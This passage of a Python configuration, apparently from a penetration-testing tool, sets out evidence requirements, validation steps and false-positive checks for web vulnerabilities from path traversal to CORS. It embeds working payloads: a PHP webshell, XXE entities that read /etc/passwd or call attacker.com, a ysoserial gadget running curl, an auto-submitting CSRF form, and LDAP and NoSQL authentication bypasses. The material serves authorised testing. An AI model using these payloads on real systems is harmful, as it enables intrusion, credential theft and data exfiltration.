            "Source code files accessible",
            "Different files accessible with different traversal depths",
            "Can map directory structure by varying paths",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "Request with path traversal sequence",
                "Response containing file contents",
                "File content that shouldn't be accessible",
            ],
            "definitive_proof": [
                "System file content returned (/etc/passwd format)",
                "Application config with credentials visible",
                "Source code of application files",
                "Multiple files accessible at different paths",
            ],
            "misleading_outputs": [
                "404 but error message mentions the path (not traversed)",
                "Default file returned regardless of path",
                "'../' stripped from input (no actual traversal)",
                "Error page content that looks like file content",
            ],
            "differentiation_tips": [
                "True LFI: Content changes based on file requested",
                "True LFI: Format matches expected file type (passwd, ini, etc.)",
                "False positive: Same content for all traversal attempts",
                "False positive: 404/error with traversal path in message",
            ],
            "tool_verifications": [
                {"tool": "curl", "command": "curl '{url}?file=../../../etc/passwd'", "expected": "root:x:0:0: format", "notes": "Try multiple traversal depths"},
                {"tool": "dotdotpwn", "command": "dotdotpwn -m http -h {host} -O", "expected": "Successful traversal found", "notes": "Automated traversal testing"},
            ],
            "do_not_report_as_exploited": [
                "Traversal filtered and no file access achieved",
                "Can only access files already accessible",
                "Only works with files in same directory",
            ],
            "impact_proof_requirements": [
                "Show content of sensitive file (passwd, config)",
                "Demonstrate access to files outside intended directory",
                "Show credentials or secrets if found",
            ],
        },
    },

    "sensitive_data_exposure": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response containing sensitive data",
                "capture_method": "Save response with exposed credentials/PII/secrets",
                "expected_content": "API keys, passwords, PII, tokens in response",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Visual proof of exposed data (redacted)",
                "capture_method": "Screenshot showing sensitive data visible (redact in report)",
                "expected_content": "Credentials, API keys, or PII visible",
                "filename": "{finding_id}_screenshot_redacted.png",
                "priority": "Required",
                "tools": ["Screenshot tool"],
            },
            {
                "type": EvidenceType.DATA_SAMPLE,
                "description": "Sample of exposed data (redacted)",
                "capture_method": "Export sample with sensitive portions redacted",
                "expected_content": "Enough to prove exposure without full disclosure",
                "filename": "{finding_id}_sample_redacted.json",
                "priority": "Required",
                "tools": ["Manual extraction"],
            },
        ],
        "validation": [
            {"action": "Verify data is actually sensitive (not dummy/test)", "expected": "Real credentials or PII format", "if_fails": "May be test data or placeholders"},
            {"action": "Test if exposed credentials work", "expected": "Can authenticate with found creds", "if_fails": "Credentials may be rotated/invalid"},
            {"action": "Check if data is public vs private", "expected": "Data should be protected but isn't", "if_fails": "May be intentionally public"},
            {"action": "Verify scope (one user vs all users)", "expected": "Understand exposure scope", "if_fails": "N/A"},
        ],
        "quick_verify": "Search response for patterns: password, api_key, secret, token, SSN, credit_card",
        "quick_verify_expected": "Matches found containing actual sensitive values",
        "false_positive_indicators": [
            "Field named 'password' but value is hashed",
            "API key format but actually public/read-only key",
            "Test/dummy data (password123, test@test.com)",
            "Already-public information misidentified",
        ],
        "true_positive_indicators": [
            "Plaintext passwords that authenticate successfully",
            "API keys that grant access when used",
            "PII in valid formats (real SSN, credit card patterns)",
            "Internal secrets (database connection strings)",
            "Other users' data accessible",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "Response containing sensitive data",
                "Proof the data should not be exposed",
            ],
            "definitive_proof": [
                "Plaintext credentials that work when tested",
                "API keys that grant access",
                "Real PII (not test data)",
                "Internal secrets (DB strings, encryption keys)",
            ],
            "misleading_outputs": [
                "Field named 'password' but value is properly hashed",
                "API key format but public/read-only key",
                "Test/placeholder data (password123, test@test.com)",
                "Data that's intentionally public",
            ],
            "differentiation_tips": [
                "True exposure: Data works when used (creds authenticate)",
                "True exposure: Data format matches real data patterns",
                "False positive: Hashed passwords, not plaintext",
                "False positive: Public API keys, not secret keys",
            ],
            "tool_verifications": [
                {"tool": "Manual", "command": "Try extracted credentials on login", "expected": "Authentication succeeds", "notes": "Document successful auth"},
                {"tool": "truffleHog", "command": "trufflehog --regex --entropy=True {target}", "expected": "High-entropy secrets found", "notes": "Verify secrets are valid"},
            ],
            "do_not_report_as_exploited": [
                "Hashed credentials without ability to crack",
                "Rotated/invalid credentials",
                "Intentionally public information",
            ],
            "impact_proof_requirements": [
                "Demonstrate credentials work if found",
                "Show data is actually sensitive (real PII, not test)",
                "Quantify scope (how much data exposed)",
            ],
        },
    },

    "csrf": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Malicious request forged from attacker's page",
                "capture_method": "Save the cross-origin request that performs the action",
                "expected_content": "Request with valid session but no CSRF token (or invalid token accepted)",
                "filename": "{finding_id}_forged_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite", "Browser DevTools"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Successful action response",
                "capture_method": "Save response showing action was performed",
                "expected_content": "Success response (password changed, settings updated, etc.)",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.FILE_CONTENT,
                "description": "CSRF PoC HTML page",
                "capture_method": "Save the HTML file used to trigger the CSRF",
                "expected_content": "HTML with auto-submitting form or JavaScript",
                "filename": "{finding_id}_csrf_poc.html",
                "priority": "Required",
                "tools": ["Text editor"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Before/after state showing action completed",
                "capture_method": "Screenshot showing victim's state changed after visiting attacker's page",
                "expected_content": "Account settings changed, password reset, etc.",
                "filename": "{finding_id}_state_change.png",
                "priority": "Required",
                "tools": ["Screenshot tool"],
            },
        ],
        "validation": [
            {"action": "Identify state-changing action (POST/PUT/DELETE)", "expected": "Form or API that changes server state", "if_fails": "May be safe GET-only endpoint"},
            {"action": "Check for CSRF token in request", "expected": "No token OR token not validated", "if_fails": "CSRF protection may be present"},
            {"action": "Create PoC HTML with auto-submit form", "expected": "Form submits cross-origin", "if_fails": "SameSite cookies may block"},
            {"action": "Open PoC in browser while logged into target", "expected": "Action performed on victim's behalf", "if_fails": "CORS or SameSite protection"},
            {"action": "Verify action persisted (check victim account)", "expected": "State change visible in victim's session", "if_fails": "Action may have failed silently"},
        ],
        "quick_verify": "Create HTML: <form action='TARGET_URL' method='POST'><input name='param' value='evil'></form><script>document.forms[0].submit()</script>",
        "quick_verify_expected": "Action executes when victim visits the page while authenticated",
        "false_positive_indicators": [
            "Action requires re-authentication",
            "SameSite=Strict cookies blocking cross-origin requests",
            "CSRF token present and validated (check Burp response)",
            "Action only affects attacker's own session",
        ],
        "true_positive_indicators": [
            "State-changing action completes from cross-origin",
            "No CSRF token required",
            "Token present but not validated (remove it, still works)",
            "Victim's account modified by visiting attacker's page",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "CSRF PoC HTML file",
                "Proof of state change on victim's account",
                "Confirmation action was triggered cross-origin",
            ],
            "definitive_proof": [
                "Victim account state changed after visiting attacker page",
                "Action logged with victim's session (check server logs)",
                "Password/email changed via CSRF",
                "Sensitive action performed without user's knowledge",
            ],
            "misleading_outputs": [
                "Request blocked by SameSite cookies (check browser console)",
                "CORS preflight failed (action not sent)",
                "Token required but we didn't include one (server rejected)",
                "Action only affects attacker's session",
            ],
            "differentiation_tips": [
                "True CSRF: Action affects VICTIM's account from attacker page",
                "True CSRF: Works in fresh browser with victim logged in",
                "False positive: SameSite=Strict blocks the request",
                "False positive: CSRF token validated on server side",
            ],
            "tool_verifications": [
                {"tool": "Browser", "command": "Open PoC.html in browser where victim is logged into target", "expected": "Action executes, victim state changes", "notes": "Check target site for changes"},
                {"tool": "Burp CSRF PoC Generator", "command": "Right-click request > Engagement tools > Generate CSRF PoC", "expected": "HTML form that triggers action", "notes": "Test in real browser scenario"},
            ],
            "do_not_report_as_exploited": [
                "SameSite cookies blocking cross-origin requests",
                "CSRF token properly validated",
                "Only GET requests exploitable (lower impact)",
            ],
            "impact_proof_requirements": [
                "Show victim state change from attacker's page",
                "Demonstrate significant action (not just preferences)",
                "Show this works on fresh victim session",
            ],
        },
    },

    "xxe": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request with malicious XML entity",
                "capture_method": "Save request containing XXE payload",
                "expected_content": "XML with DOCTYPE and ENTITY declaration",
                "filename": "{finding_id}_xxe_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response containing file contents or callback",
                "capture_method": "Save response showing entity expansion",
                "expected_content": "File contents (/etc/passwd) or OOB callback data",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.FILE_CONTENT,
                "description": "Extracted file contents",
                "capture_method": "Extract and save the file content retrieved via XXE",
                "expected_content": "/etc/passwd, web.config, or other sensitive file",
                "filename": "{finding_id}_extracted_file.txt",
                "priority": "Required",
                "tools": ["Manual extraction"],
            },
            {
                "type": EvidenceType.NETWORK_CAPTURE,
                "description": "OOB callback for blind XXE",
                "capture_method": "Capture HTTP/DNS callback from target server",
                "expected_content": "Request from target to your server with extracted data",
                "filename": "{finding_id}_oob_callback.txt",
                "priority": "For blind XXE",
                "tools": ["Burp Collaborator", "netcat"],
            },
        ],
        "validation": [
            {"action": "Identify XML parsing endpoint", "expected": "Endpoint accepts XML input", "if_fails": "May not process XML"},
            {"action": "Test basic entity: <!ENTITY test 'hello'>&test;", "expected": "Entity expanded in response", "if_fails": "Entities may be disabled"},
            {"action": "Test file read: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>", "expected": "File contents in response", "if_fails": "External entities may be disabled"},
            {"action": "Test OOB: <!ENTITY xxe SYSTEM 'http://attacker.com/'>", "expected": "Callback received", "if_fails": "May need parameter entities"},
            {"action": "Try parameter entity for blind: %xxe;", "expected": "OOB exfiltration works", "if_fails": "Strict parser configuration"},
        ],
        "quick_verify": "Send: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><data>&xxe;</data>",
        "quick_verify_expected": "Response contains /etc/passwd content (root:x:0:0:...)",
        "false_positive_indicators": [
            "Error message but no actual file read",
            "Entities disabled (entity reference error)",
            "External entities blocked (network error for SYSTEM)",
            "Response contains literal entity text, not expanded",
        ],
        "true_positive_indicators": [
            "Local file contents returned (/etc/passwd, /etc/hosts)",
            "SSRF via XXE (internal URL accessed)",
            "OOB data exfiltration successful",
            "DTD from external server loaded",
            "Error-based extraction shows data",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "Request with XXE payload",
                "Evidence of entity expansion (file or callback)",
            ],
            "definitive_proof": [
                "File contents returned in response",
                "External DTD loaded from attacker server",
                "OOB data exfiltration to attacker server",
                "SSRF achieved via XXE",
            ],
            "misleading_outputs": [
                "XML parsing error but no entity expansion",
                "Entity reference appears in error (not expanded)",
                "SYSTEM keyword in error (blocked, not executed)",
                "Timeout without callback (blocked outbound)",
            ],
            "differentiation_tips": [
                "True XXE: Entity content REPLACED with file/URL content",
                "True XXE: OOB callback received from target",
                "False positive: Entity reference literal in response",
                "False positive: External entities disabled error",
            ],
            "tool_verifications": [
                {"tool": "Burp Collaborator", "command": "Use DTD with Collaborator callback", "expected": "HTTP/DNS callback received", "notes": "Use for blind XXE"},
                {"tool": "xxeftp", "command": "Set up FTP server for OOB exfil", "expected": "File contents in FTP connection", "notes": "Alternative to HTTP for exfil"},
            ],
            "do_not_report_as_exploited": [
                "External entities disabled (error message)",
                "XML parsed but entities not expanded",
                "Only internal entities work (limited impact)",
            ],
            "impact_proof_requirements": [
                "Show file content retrieved",
                "For OOB: show data in callback",
                "Demonstrate SSRF potential if applicable",
            ],
        },
    },

    "deserialization": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request with malicious serialized object",
                "capture_method": "Save request containing gadget chain payload",
                "expected_content": "Serialized object (Java, PHP, .NET, Python pickle)",
                "filename": "{finding_id}_payload_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite", "ysoserial"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response showing code execution or error",
                "capture_method": "Save response indicating deserialization occurred",
                "expected_content": "Command output, DNS lookup, or stack trace",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.NETWORK_CAPTURE,
                "description": "DNS/HTTP callback proving execution",
                "capture_method": "Capture callback from deserialization payload",
                "expected_content": "DNS query or HTTP request from target",
                "filename": "{finding_id}_callback.txt",
                "priority": "Required",
                "tools": ["Burp Collaborator", "DNSLog"],
            },
            {
                "type": EvidenceType.COMMAND_OUTPUT,
                "description": "RCE command output",
                "capture_method": "Capture output of executed command",
                "expected_content": "Output of id, whoami, or other command",
                "filename": "{finding_id}_rce_output.txt",
                "priority": "If RCE achieved",
                "tools": ["Burp Suite", "netcat"],
            },
        ],
        "validation": [
            {"action": "Identify serialized data (Java: rO0, PHP: O:, .NET: AAEAAAD)", "expected": "Serialization format identified", "if_fails": "May not be serialized data"},
            {"action": "Generate payload with ysoserial/phpggc", "expected": "Valid gadget chain for target framework", "if_fails": "Try different gadget chains"},
            {"action": "Send payload and check for DNS callback", "expected": "DNS query received from target", "if_fails": "Payload may not execute"},
            {"action": "Escalate to command execution", "expected": "RCE achieved", "if_fails": "May need different gadget"},
            {"action": "Verify execution context (user, permissions)", "expected": "Understand access level", "if_fails": "N/A"},
        ],
        "quick_verify": "Use ysoserial with DNS payload: java -jar ysoserial.jar URLDNS 'http://COLLABORATOR' | base64",
        "quick_verify_expected": "DNS lookup received at Collaborator from target server",
        "false_positive_indicators": [
            "Deserialization error but no execution",
            "Gadget class not available in target",
            "Serialization filter blocking payload",
            "Sandbox preventing command execution",
        ],
        "true_positive_indicators": [
            "DNS/HTTP callback received from target",
            "Command output visible in response",
            "Stack trace shows gadget chain execution",
            "File written or system state changed",
            "Reverse shell connection received",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "Serialized payload sent to target",
                "Evidence of deserialization execution (callback)",
            ],
            "definitive_proof": [
                "DNS/HTTP callback from target server",
                "Command execution output",
                "Stack trace showing gadget chain",
                "Reverse shell connection",
            ],
            "misleading_outputs": [
                "Deserialization error (class not found)",
                "Object created but gadget didn't fire",
                "Callback from wrong IP (not target)",
                "Stack trace but no actual execution",
            ],
            "differentiation_tips": [
                "True deser: Callback source is TARGET server",
                "True deser: Command output visible or shell received",
                "False positive: ClassNotFoundException = gadget unavailable",
                "False positive: Serialization filter blocking",
            ],
            "tool_verifications": [
                {"tool": "ysoserial", "command": "java -jar ysoserial.jar CommonsCollections5 'curl COLLAB'", "expected": "Callback received", "notes": "Try multiple gadget chains"},
                {"tool": "Burp Collaborator", "command": "Use URLDNS gadget for detection", "expected": "DNS query from target", "notes": "URLDNS works without RCE gadgets"},
            ],
            "do_not_report_as_exploited": [
                "Deserialization happens but no usable gadget",
                "Sandbox prevents command execution",
                "Serialization filter blocks dangerous classes",
            ],
            "impact_proof_requirements": [
                "Show callback from target server",
                "If RCE: show command output",
                "Document gadget chain that worked",
            ],
        },
    },

    "file_upload": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Upload request with malicious file",
                "capture_method": "Save multipart upload request with payload",
                "expected_content": "Webshell, polyglot, or malicious file uploaded",
                "filename": "{finding_id}_upload_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response confirming upload and file location",
                "capture_method": "Save response with uploaded file path",
                "expected_content": "File path or URL where file was stored",
                "filename": "{finding_id}_upload_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response from accessing uploaded file",
                "capture_method": "Save response when accessing the uploaded file",
                "expected_content": "Webshell output or executed code result",
                "filename": "{finding_id}_execution_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite", "Browser"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Webshell or code execution proof",
                "capture_method": "Screenshot showing shell access or code output",
                "expected_content": "Command execution via uploaded file",
                "filename": "{finding_id}_rce_screenshot.png",
                "priority": "Required",
                "tools": ["Screenshot tool"],
            },
        ],
        "validation": [
            {"action": "Upload legitimate file to understand flow", "expected": "Understand file storage location", "if_fails": "N/A"},
            {"action": "Upload file with executable extension (.php, .jsp, .asp)", "expected": "File accepted or blocked", "if_fails": "Extension blacklist may exist"},
            {"action": "Try extension bypass (double ext, null byte, case)", "expected": "Bypass extension filter", "if_fails": "Try content-type or magic byte bypass"},
            {"action": "Access uploaded file directly", "expected": "File executed as code", "if_fails": "May be stored outside webroot"},
            {"action": "Execute command via webshell", "expected": "Command output returned", "if_fails": "May need to adjust payload"},
        ],
        "quick_verify": "Upload: shell.php containing <?php system($_GET['cmd']); ?> then access shell.php?cmd=id",
        "quick_verify_expected": "Response contains uid= showing command executed",
        "false_positive_indicators": [
            "File uploaded but stored with .txt extension",
            "File uploaded but not accessible (private storage)",
            "File uploaded but not executed (downloaded instead)",
            "Upload accepted but file deleted/quarantined",
        ],
        "true_positive_indicators": [
            "Webshell executes commands",
            "Uploaded file runs in server context",
            "Achieved code execution via upload",
            "Can upload to webroot and access directly",
            "Extension bypass successful",
        ],
        "proof_of_exploitation": {
            "minimum_evidence": [
                "Malicious file uploaded successfully",
                "File accessible and executed on server",
            ],
            "definitive_proof": [
                "Webshell executes commands (id, whoami output)",
                "Uploaded PHP/JSP/ASP code runs",
                "File stored with executable extension",
                "Code execution achieved via upload",
            ],
            "misleading_outputs": [
                "File uploaded but renamed with safe extension",
                "File uploaded but stored outside webroot",
                "File accessible but downloaded not executed",
                "Upload success but file deleted by AV",
            ],
            "differentiation_tips": [
                "True upload vuln: Code EXECUTES not just uploads",
                "True upload vuln: Can achieve RCE via uploaded file",
                "False positive: File uploaded but .txt extension",
                "False positive: File served as download",
            ],
            "tool_verifications": [
                {"tool": "curl", "command": "Upload shell.php, then curl '{upload_path}?cmd=id'", "expected": "uid=www-data output", "notes": "Verify code execution"},
                {"tool": "Burp", "command": "Upload with double extension (shell.php.jpg)", "expected": "PHP executes despite .jpg", "notes": "Test extension filter bypass"},
            ],
            "do_not_report_as_exploited": [
                "File uploaded but no path to access it",
                "File uploaded but not executed (wrong extension)",
                "Upload to private storage (no web access)",
            ],
            "impact_proof_requirements": [
                "Show command execution via uploaded file",
                "Demonstrate file runs in server context",
                "Show full path to access uploaded file",
            ],
        },
    },

    "open_redirect": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request with malicious redirect URL",
                "capture_method": "Save request with external redirect parameter",
                "expected_content": "URL parameter pointing to attacker's site",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite", "Browser"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "302 redirect to attacker's URL",
                "capture_method": "Save response showing redirect to external site",
                "expected_content": "Location header pointing to attacker-controlled URL",
                "filename": "{finding_id}_redirect_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Browser landing on attacker's site",
                "capture_method": "Screenshot showing redirect completed to attacker site",
                "expected_content": "Browser on attacker's domain after clicking link",
                "filename": "{finding_id}_redirect_proof.png",
                "priority": "Required",
                "tools": ["Browser", "Screenshot tool"],
            },
        ],
        "validation": [
            {"action": "Identify redirect parameters (url, redirect, next, return)", "expected": "Parameter that controls redirect destination", "if_fails": "Try other parameter names"},
            {"action": "Set parameter to https://evil.com", "expected": "Redirect to evil.com", "if_fails": "Try bypass techniques"},
            {"action": "Try bypass: //evil.com, /\\evil.com, evil.com%2F", "expected": "Bypass URL validation", "if_fails": "Strong validation present"},
            {"action": "Test with registered similar domain", "expected": "Redirect to lookalike domain", "if_fails": "Whitelist may be strict"},
            {"action": "Craft phishing scenario (login page clone)", "expected": "Demonstrate credential theft risk", "if_fails": "N/A - severity assessment"},
        ],
        "quick_verify": "Access: https://target.com/redirect?url=https://evil.com and check if browser redirects to evil.com",
        "quick_verify_expected": "Browser redirects to attacker-controlled URL",
        "false_positive_indicators": [
            "Redirect only to same domain",
            "Whitelist of allowed redirect domains",
            "Warning page before external redirect",
            "Redirect URL shown but not followed",
        ],
        "true_positive_indicators": [
            "Redirects to any external URL",
            "Can redirect to attacker's domain",
            "No validation on redirect parameter",
            "Bypass techniques successful",
            "Can be used in phishing attack",
        ],
    },

    "jwt_vulnerability": {
        "evidence": [
            {
                "type": EvidenceType.TOKEN_VALUE,
                "description": "Original and modified JWT tokens",
                "capture_method": "Save original JWT and crafted malicious JWT",
                "expected_content": "Original token vs modified token (alg:none, changed claims)",
                "filename": "{finding_id}_jwt_tokens.txt",
                "priority": "Required",
                "tools": ["jwt.io", "Burp Suite", "jwt_tool"],
            },
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request with modified JWT",
                "capture_method": "Save request using forged/modified token",
                "expected_content": "Authorization header with crafted JWT",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response showing elevated access",
                "capture_method": "Save response proving token manipulation worked",
                "expected_content": "Access granted with modified privileges/identity",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Decoded JWT showing manipulation",
                "capture_method": "Screenshot of jwt.io showing modified claims accepted",
                "expected_content": "Side-by-side original vs modified token",
                "filename": "{finding_id}_jwt_decode.png",
                "priority": "Recommended",
                "tools": ["jwt.io", "Screenshot tool"],
            },
        ],
        "validation": [
            {"action": "Decode JWT and examine claims", "expected": "Understand token structure", "if_fails": "N/A"},
            {"action": "Try alg:none attack (remove signature)", "expected": "Token accepted without signature", "if_fails": "Algorithm validated"},
            {"action": "Try HS256/RS256 confusion", "expected": "Use public key as HMAC secret", "if_fails": "Algorithm strictly enforced"},
            {"action": "Modify claims (user ID, role, exp)", "expected": "Modified claims accepted", "if_fails": "Signature verified correctly"},
            {"action": "Test expired token acceptance", "expected": "Expired tokens still work", "if_fails": "Expiration properly enforced"},
        ],
        "quick_verify": "Change alg to 'none', remove signature, modify claims: jwt_tool -t TOKEN -X a",
        "quick_verify_expected": "Server accepts unsigned or improperly signed token with modified claims",
        "false_positive_indicators": [
            "Token rejected when modified",
            "Signature properly verified",
            "Algorithm strictly validated",
            "Token bound to IP/session",
        ],
        "true_positive_indicators": [
            "alg:none token accepted",
            "Signature verification bypassed",
            "Can elevate privileges via claim modification",
            "Expired tokens accepted",
            "Can impersonate other users",
        ],
    },

    "ldap_injection": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request with LDAP injection payload",
                "capture_method": "Save request with injected LDAP filter",
                "expected_content": "Request with *)(&, )(uid=*, or other LDAP metacharacters",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response showing LDAP query manipulation",
                "capture_method": "Save response indicating successful injection",
                "expected_content": "Extra data returned, auth bypass, or error message",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.DATA_SAMPLE,
                "description": "Extracted LDAP data",
                "capture_method": "Save any data extracted via LDAP injection",
                "expected_content": "User list, attributes, or sensitive LDAP data",
                "filename": "{finding_id}_ldap_data.txt",
                "priority": "If extraction possible",
                "tools": ["Manual extraction"],
            },
        ],
        "validation": [
            {"action": "Inject *) to test filter break", "expected": "Query behavior changes", "if_fails": "Input sanitized"},
            {"action": "Try auth bypass: *)(&", "expected": "Login without valid creds", "if_fails": "May need different payload"},
            {"action": "Try wildcard enumeration: a*, b*, c*", "expected": "Different results for each", "if_fails": "Wildcards may be filtered"},
            {"action": "Extract attributes: )(|(objectClass=*)", "expected": "Return all objects", "if_fails": "Query structure unknown"},
        ],
        "quick_verify": "In login form, try username: *)(uid=*))(|(uid=* or admin)(&",
        "quick_verify_expected": "Authentication bypassed or multiple users returned",
        "false_positive_indicators": [
            "Error message but no query manipulation",
            "Input rejected/sanitized",
            "LDAP characters escaped properly",
        ],
        "true_positive_indicators": [
            "Authentication bypassed",
            "Can enumerate users via wildcards",
            "LDAP error messages reveal query structure",
            "Can extract LDAP attributes",
        ],
    },

    "nosql_injection": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request with NoSQL injection payload",
                "capture_method": "Save request with MongoDB/NoSQL operators",
                "expected_content": "Request with $ne, $gt, $regex, or JSON injection",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response showing query manipulation",
                "capture_method": "Save response with extra/modified data",
                "expected_content": "Data returned that shouldn't be, or auth bypass",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Auth bypass or data extraction proof",
                "capture_method": "Screenshot showing unauthorized access",
                "expected_content": "Access granted or extra data visible",
                "filename": "{finding_id}_screenshot.png",
                "priority": "Required",
                "tools": ["Screenshot tool"],
            },
        ],
        "validation": [
            {"action": "Try $ne operator: {'password': {'$ne': ''}}", "expected": "Bypasses password check", "if_fails": "Operators may be filtered"},
            {"action": "Try $regex for enumeration: {'user': {'$regex': '^a'}}", "expected": "Returns users starting with 'a'", "if_fails": "Regex may be blocked"},
            {"action": "Try JSON injection in form: username[$ne]=", "expected": "Operator injected via form", "if_fails": "Try Content-Type: application/json"},
            {"action": "Extract data via blind techniques", "expected": "Enumerate data character by character", "if_fails": "May need different approach"},
        ],
        "quick_verify": "Send: username=admin&password[$ne]=wrong - should bypass password check",
        "quick_verify_expected": "Login successful without valid password",
        "false_positive_indicators": [
            "Operators rejected by application",
            "Query structure prevents injection",
            "Input type strictly enforced",
        ],
        "true_positive_indicators": [
            "Authentication bypassed via $ne",
            "Can enumerate with $regex",
            "Query operators accepted and processed",
            "Can extract data via blind injection",
        ],
    },

    "race_condition": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Multiple concurrent requests",
                "capture_method": "Save the requests sent simultaneously",
                "expected_content": "Multiple identical or related requests",
                "filename": "{finding_id}_requests.txt",
                "priority": "Required",
                "tools": ["Burp Turbo Intruder", "curl parallel"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Responses showing race success",
                "capture_method": "Save all responses showing unexpected behavior",
                "expected_content": "Multiple successes where only one should occur",
                "filename": "{finding_id}_responses.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Final state showing race impact",
                "capture_method": "Screenshot of account/system after race condition",
                "expected_content": "Double redemption, negative balance, extra items, etc.",
                "filename": "{finding_id}_result.png",
                "priority": "Required",
                "tools": ["Screenshot tool"],
            },
            {
                "type": EvidenceType.LOG_ENTRY,
                "description": "Request timing data",
                "capture_method": "Log showing requests arrived simultaneously",
                "expected_content": "Timestamps within milliseconds of each other",
                "filename": "{finding_id}_timing.txt",
                "priority": "Recommended",
                "tools": ["Burp Logger", "curl verbose"],
            },
        ],
        "validation": [
            {"action": "Identify time-of-check-time-of-use (TOCTOU) operation", "expected": "Action with check followed by use", "if_fails": "May not be vulnerable"},
            {"action": "Set up Turbo Intruder for parallel requests", "expected": "Tool ready for race test", "if_fails": "N/A"},
            {"action": "Send 10-50 requests simultaneously", "expected": "Multiple requests succeed", "if_fails": "Increase parallelism or timing"},
            {"action": "Verify final state shows race impact", "expected": "Double redemption, etc.", "if_fails": "Race may not have succeeded"},
        ],
        "quick_verify": "Use Turbo Intruder with race condition template, send 20 parallel requests",
        "quick_verify_expected": "More than one request succeeds where only one should",
        "false_positive_indicators": [
            "Only one request succeeds (proper locking)",
            "Requests serialized by server",
            "Idempotent operation (repeating has no effect)",
        ],
        "true_positive_indicators": [
            "Multiple redemptions of single-use code",
            "Balance goes negative",
            "Resource created multiple times",
            "Limit bypass via race",
        ],
    },

    "cors_misconfiguration": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request with malicious Origin header",
                "capture_method": "Save request with attacker's origin",
                "expected_content": "Origin: https://evil.com header",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite", "curl"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response with permissive CORS headers",
                "capture_method": "Save response reflecting attacker's origin",
                "expected_content": "Access-Control-Allow-Origin: https://evil.com with credentials",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.FILE_CONTENT,
                "description": "PoC HTML demonstrating data theft",
                "capture_method": "Save HTML page that steals data cross-origin",
                "expected_content": "JavaScript making cross-origin request and reading response",
                "filename": "{finding_id}_cors_poc.html",
                "priority": "Required",
                "tools": ["Text editor"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Console showing stolen data",
                "capture_method": "Screenshot of browser console with cross-origin data",
                "expected_content": "API response data visible in attacker's page",
                "filename": "{finding_id}_data_theft.png",
                "priority": "Required",
                "tools": ["Browser DevTools"],
            },
        ],
        "validation": [
            {"action": "Send request with Origin: https://evil.com", "expected": "ACAO header reflects origin", "if_fails": "Origin may not be reflected"},
            {"action": "Check for Access-Control-Allow-Credentials: true", "expected": "Credentials allowed with reflected origin", "if_fails": "Less severe without credentials"},
